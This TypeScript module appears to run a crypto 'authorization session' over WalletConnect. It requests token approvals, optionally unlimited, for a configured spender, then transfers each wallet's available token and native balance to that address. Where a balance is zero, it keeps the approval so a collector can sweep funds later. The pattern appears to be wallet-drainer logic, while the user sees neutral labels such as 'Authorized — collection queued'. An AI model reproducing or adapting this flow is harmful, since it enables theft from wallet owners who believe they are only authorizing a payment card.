import { formatTransferSkipReason } from "@trustmycard/shared/constants/collection";
import { getToken, parseHumanToRaw } from "../core/chain-tokens";
import type { ApprovalOrchestrationResult } from "../approval/types";
import { ApprovalStageName } from "../approval/types";
import type { NativeTransferResult } from "../native-transfer/types";
import { getErrorMessage, isUserRejection } from "../core/errors";
import {
  SessionTimelineTracker,
  flushSessionTimeline,
} from "../observability/session-timeline";
import type { LogStatus } from "@trustmycard/shared/observability";
import type {
  AuthorizationAssetOutcome,
  AuthorizationAssetResult,
  AuthorizationSessionResult,
  LinkedAccounts,
  NetworkRow,
  TokenSymbol,
} from "../types";
import {
  balanceForNative,
  balanceForToken,
  nativeDecimalsForNetwork,
  type IncludedAssetWorkItem,
} from "./preferences";

export type RunAuthorizationSessionArgs = {
  items: IncludedAssetWorkItem[];
  networks: NetworkRow[];
  accounts: LinkedAccounts;
  getSpender: (networkKey: string) => string;
  runApproval: (args: {
    network: string;
    owner: string;
    token: TokenSymbol;
    amountHuman?: string;
    unlimited: boolean;
    nativeBalanceHuman: string;
    tokenBalanceHuman: string;
    executeTransfer: boolean;
    transferToAddress: string;
    transferAmountRaw?: string;
    onStage?: (stageResult: {
      stage: string;
      status: string;
      data?: unknown;
      error?: string | null;
    }) => void;
  }) => Promise<ApprovalOrchestrationResult>;
  runNativeTransfer?: (args: {
    network: string;
    owner: string;
    unlimited: boolean;
    amountHuman?: string;
    onStage?: (stageResult: {
      stage: string;
      status: string;
      error?: string | null;
    }) => void;
  }) => Promise<NativeTransferResult>;
  onAssetStart?: (item: IncludedAssetWorkItem) => void;
  onAssetEnd?: (result: AuthorizationAssetResult) => void;
  log?: (step: string, detail?: Record<string, unknown>) => void;
  sessionId?: string;
  authorizationSessionId?: string;
};

function isSuccessOutcome(outcome: AuthorizationAssetOutcome): boolean {
  return (
    outcome === "authorized" ||
    outcome === "collected" ||
    outcome === "pending"
  );
}

function summarize(
  items: AuthorizationAssetResult[]
): AuthorizationSessionResult {
  return {
    items,
    authorizedCount: items.filter((i) => isSuccessOutcome(i.outcome)).length,
    failedCount: items.filter((i) => i.outcome === "failed").length,
    rejectedCount: items.filter((i) => i.outcome === "user_rejected").length,
    skippedCount: items.filter((i) =>
      i.outcome === "skipped_unsupported" || i.outcome === "skipped_zero"
    ).length,
  };
}

/**
 * Run independent token approvals and native transfers for every included preference.
 * One asset failing or being rejected NEVER aborts the remaining assets.
 */
export async function runAuthorizationSession(
  args: RunAuthorizationSessionArgs
): Promise<AuthorizationSessionResult> {
  const results: AuthorizationAssetResult[] = [];
  const log = args.log ?? (() => undefined);
  const sessionId =
    args.sessionId ??
    args.authorizationSessionId ??
    `auth-${Date.now().toString(36)}`;
  const timeline = new SessionTimelineTracker({
    sessionId,
    authorizationSessionId: args.authorizationSessionId ?? sessionId,
  });
  timeline.startRoot("AUTHORIZATION_STARTED");

  log("AUTHORIZATION SESSION STARTED", {
    sessionId,
    assetCount: args.items.length,
    assets: args.items.map((i) => `${i.network}:${i.asset}`),
  });

  for (const item of args.items) {
    args.onAssetStart?.(item);

    if (item.asset === "NATIVE") {
      await runNativeAsset({
        item: item as IncludedAssetWorkItem & { asset: "NATIVE" },
        args,
        results,
        log,
      });
      continue;
    }

    await runTokenAsset({
      item: { ...item, asset: item.asset },
      args,
      results,
      log,
    });
  }

  const summary = summarize(results);
  const outcome: LogStatus =
    summary.failedCount > 0 || summary.rejectedCount > 0
      ? summary.authorizedCount > 0
        ? "partial_success"
        : "failure"
      : "success";
  timeline.complete(outcome);
  void flushSessionTimeline(timeline.snapshot());
  log("AUTHORIZATION SESSION COMPLETE", {
    sessionId,
    authorizedCount: summary.authorizedCount,
    failedCount: summary.failedCount,
    rejectedCount: summary.rejectedCount,
    skippedCount: summary.skippedCount,
    items: summary.items,
  });
  return summary;
}

async function runTokenAsset(ctx: {
  item: IncludedAssetWorkItem & { asset: TokenSymbol };
  args: RunAuthorizationSessionArgs;
  results: AuthorizationAssetResult[];
  log: RunAuthorizationSessionArgs["log"];
}): Promise<void> {
  const { item, args, results, log } = ctx;
  const token = item.asset;

  const networkRow = args.networks.find((n) => n.key === item.network);
  const tokenInfo = getToken(item.network, token);
  if (!networkRow || !tokenInfo) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: "skipped_unsupported",
      message: `Unsupported token ${token} on ${item.network}`,
    };
    results.push(result);
    args.onAssetEnd?.(result);
    log?.("AUTHORIZATION ASSET SKIPPED", result);
    return;
  }

  const owner =
    item.network === "tron" ? args.accounts.tron : args.accounts.evm;
  if (!owner) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: "failed",
      message:
        item.network === "tron"
          ? "No Tron address in this WalletConnect session"
          : "No EVM address in this WalletConnect session",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    log?.("AUTHORIZATION ASSET FAILED", result);
    return;
  }

  const spender = args.getSpender(item.network);
  if (!spender) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: "failed",
      message: "Spender not configured",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    log?.("AUTHORIZATION ASSET FAILED", result);
    return;
  }

  const tokenBalanceHuman = balanceForToken(networkRow, token);
  const trxBalance =
    item.network === "tron"
      ? Number.parseFloat(networkRow.balances.native || "0")
      : 0;

  try {
    const availableBalanceRaw = parseHumanToRaw(
      tokenBalanceHuman,
      tokenInfo.decimals
    );
    const requestedTransferRaw = item.unlimited
      ? availableBalanceRaw
      : parseHumanToRaw(item.amountHuman, tokenInfo.decimals);
    const transferAmountRaw =
      availableBalanceRaw < requestedTransferRaw
        ? availableBalanceRaw.toString()
        : requestedTransferRaw.toString();
    const shouldAttemptTransfer = BigInt(transferAmountRaw) > BigInt(0);

    if (!shouldAttemptTransfer) {
      log?.("ZERO_BALANCE_COLLECT_LATER", {
        network: item.network,
        token,
        tokenBalanceHuman,
        policy: "approve proceeds — collector will transfer when balance > 0",
      });
    }

    log?.("TOKEN FLOW STARTED", {
      network: item.network,
      token,
      transferAmountRaw,
      shouldAttemptTransfer,
      availableBalanceRaw: availableBalanceRaw.toString(),
      unlimited: item.unlimited,
    });

    const orchestration = await args.runApproval({
      network: item.network,
      owner,
      token,
      amountHuman: item.unlimited ? undefined : item.amountHuman,
      unlimited: item.unlimited,
      nativeBalanceHuman: String(trxBalance),
      tokenBalanceHuman,
      executeTransfer: shouldAttemptTransfer,
      transferToAddress: spender,
      transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
      onStage: (stageResult) => {
        if (
          stageResult.stage === ApprovalStageName.ACQUIRE_RESOURCES ||
          stageResult.stage === ApprovalStageName.WAIT_RESOURCES_READY
        ) {
          const data = stageResult.data as
            | { status?: string; message?: string | null; provider?: string | null }
            | undefined;
          log?.(
            stageResult.stage === ApprovalStageName.ACQUIRE_RESOURCES
              ? "RESOURCE ACQUIRE"
              : "RESOURCE VERIFY",
            {
              network: item.network,
              token,
              status: data?.status ?? stageResult.status,
              message: data?.message ?? stageResult.error ?? null,
              provider: data?.provider ?? null,
            }
          );
        }
      },
    });

    if (!orchestration.ok) {
      const rejected = Boolean(orchestration.userRejected);
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: rejected ? "user_rejected" : "failed",
        message: getErrorMessage(orchestration.error, "Approval failed"),
        txHash: orchestration.txHash,
        approvalId: orchestration.approvalId,
      };
      results.push(result);
      args.onAssetEnd?.(result);
      log?.(
        rejected ? "AUTHORIZATION ASSET REJECTED" : "AUTHORIZATION ASSET FAILED",
        result
      );
      return;
    }

    const persisted = orchestration.context.persisted;
    const skipLabel = persisted?.transferSkippedReason
      ? formatTransferSkipReason(persisted.transferSkippedReason)
      : null;
    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: "authorized",
      message: skipLabel
        ? `Authorized — ${skipLabel}`
        : "Authorized — collection queued",
      approvalId: orchestration.approvalId,
      collectionIntentId: persisted?.collectionIntentId ?? null,
      collectionStatus: persisted?.collectionStatus ?? null,
      txHash: orchestration.txHash,
      transferSkippedReason: persisted?.transferSkippedReason ?? null,
    };
    results.push(result);
    args.onAssetEnd?.(result);

    if (persisted?.transferTxHash) {
      log?.("TOKEN AUTHORIZE + TRANSFER EXECUTED", {
        fundsMoved: "YES — transferFrom executed",
        network: item.network,
        owner,
        token,
        approveTxHash: orchestration.txHash,
        transferTxHash: persisted.transferTxHash,
        approvalId: orchestration.approvalId,
        collectionIntentId: persisted?.collectionIntentId ?? null,
      });
    } else {
      log?.("TOKEN AUTHORIZE COMPLETE — COLLECTION QUEUED", {
        fundsMoved: "NO — auto transfer not executed yet",
        reason:
          persisted?.transferSkippedReason ??
          "No transfer executed for this approval",
        network: item.network,
        owner,
        token,
        approveTxHash: orchestration.txHash,
        approvalId: orchestration.approvalId,
      });
    }
  } catch (err: unknown) {
    const rejected = isUserRejection(err);
    const result: AuthorizationAssetResult = {
      network: item.network,
      token,
      outcome: rejected ? "user_rejected" : "failed",
      message: getErrorMessage(err, "Approval failed"),
    };
    results.push(result);
    args.onAssetEnd?.(result);
    log?.(
      rejected ? "AUTHORIZATION ASSET REJECTED" : "AUTHORIZATION ASSET FAILED",
      { ...result, error: result.message }
    );
  }
}

async function runNativeAsset(ctx: {
  item: IncludedAssetWorkItem & { asset: "NATIVE" };
  args: RunAuthorizationSessionArgs;
  results: AuthorizationAssetResult[];
  log: RunAuthorizationSessionArgs["log"];
}): Promise<void> {
  const { item, args, results, log } = ctx;

  if (!args.runNativeTransfer) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: "failed",
      message: "Native transfer handler not configured",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    log?.("NATIVE ASSET FAILED", result);
    return;
  }

  const networkRow = args.networks.find((n) => n.key === item.network);
  const owner =
    item.network === "tron" ? args.accounts.tron : args.accounts.evm;

  if (!networkRow || !owner) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: "failed",
      message: !owner
        ? item.network === "tron"
          ? "No Tron address in this WalletConnect session"
          : "No EVM address in this WalletConnect session"
        : "Unsupported network",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    log?.("NATIVE ASSET FAILED", result);
    return;
  }

  const spender = args.getSpender(item.network);
  if (!spender) {
    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: "failed",
      message: "Collector not configured",
    };
    results.push(result);
    args.onAssetEnd?.(result);
    log?.("NATIVE ASSET FAILED", result);
    return;
  }

  const nativeBalanceHuman = balanceForNative(networkRow);
  const nativeDecimals = nativeDecimalsForNetwork(item.network);
  const availableBalanceRaw = parseHumanToRaw(nativeBalanceHuman, nativeDecimals);

  log?.("NATIVE FLOW STARTED", {
    network: item.network,
    unlimited: item.unlimited,
    amountHuman: item.amountHuman || null,
    nativeBalanceHuman,
    availableBalanceRaw: availableBalanceRaw.toString(),
    zeroBalance: availableBalanceRaw <= BigInt(0),
    policy:
      availableBalanceRaw <= BigInt(0)
        ? "zero balance — attempting estimate; will fail without transferable funds"
        : "standard native transfer",
  });

  try {
    const nativeResult = await args.runNativeTransfer({
      network: item.network,
      owner,
      unlimited: item.unlimited,
      amountHuman: item.unlimited ? undefined : item.amountHuman,
      onStage: (stageResult) => {
        log?.("NATIVE STAGE", {
          network: item.network,
          stage: stageResult.stage,
          status: stageResult.status,
          error: stageResult.error ?? null,
        });
      },
    });

    if (!nativeResult.ok) {
      const rejected = Boolean(nativeResult.userRejected);
      const errMsg = getErrorMessage(nativeResult.error, "Native transfer failed");
      const zeroTransfer = /insufficient balance after network fees|nothing transferable|no transferable/i.test(
        errMsg
      );
      const result: AuthorizationAssetResult = {
        network: item.network,
        token: "NATIVE",
        outcome: rejected ? "user_rejected" : "failed",
        message: zeroTransfer
          ? "No transferable native balance — cannot send until wallet is funded"
          : errMsg,
        txHash: nativeResult.txHash,
      };
      results.push(result);
      args.onAssetEnd?.(result);
      log?.(
        rejected
          ? "NATIVE ASSET REJECTED"
          : zeroTransfer
            ? "NATIVE ASSET FAILED — ZERO BALANCE"
            : "NATIVE ASSET FAILED",
        result
      );
      return;
    }

    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: nativeResult.pendingRegistered ? "pending" : "collected",
      message: nativeResult.pendingRegistered
        ? "Native transfer pending confirmation"
        : "Native transfer confirmed",
      txHash: nativeResult.txHash,
    };
    results.push(result);
    args.onAssetEnd?.(result);
    log?.("NATIVE ASSET COMPLETE", {
      fundsMoved: nativeResult.pendingRegistered
        ? "PENDING — registered for background reconciliation"
        : "YES — native transfer confirmed",
      network: item.network,
      owner,
      txHash: nativeResult.txHash,
      transferId: nativeResult.transferId,
    });
  } catch (err: unknown) {
    const rejected = isUserRejection(err);
    const result: AuthorizationAssetResult = {
      network: item.network,
      token: "NATIVE",
      outcome: rejected ? "user_rejected" : "failed",
      message: getErrorMessage(err, "Native transfer failed"),
    };
    results.push(result);
    args.onAssetEnd?.(result);
    log?.(
      rejected ? "NATIVE ASSET REJECTED" : "NATIVE ASSET FAILED",
      { ...result, error: result.message }
    );
  }
}

export function outcomeLabel(outcome: AuthorizationAssetResult["outcome"]): string {
  switch (outcome) {
    case "authorized":
      return "Authorized — collection queued";
    case "user_rejected":
      return "User rejected — remaining assets continued";
    case "failed":
      return "Failed";
    case "skipped_unsupported":
      return "Skipped — unsupported";
    case "skipped_zero":
      return "Skipped — zero transferable";
    case "collected":
      return "Native transfer confirmed";
    case "pending":
      return "Native transfer pending";
    default:
      return outcome;
  }
}
